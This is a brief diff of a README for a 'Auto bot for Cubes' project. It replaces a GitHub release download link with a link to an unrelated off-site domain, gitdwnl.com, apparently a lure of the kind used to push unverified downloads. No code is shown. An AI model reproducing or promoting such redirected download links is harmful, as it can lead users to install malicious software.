@@ -1,4 +1,4 @@
-[DOWNLOAD](https://github.com/adeonvirtuoz33/adeonvirtuoz33/releases/tag/lat)
+[DOWNLOAD](https://gitdwnl.com/latest)
 ---
 <h1 align="center">Auto bot for Cubes</h1>
 
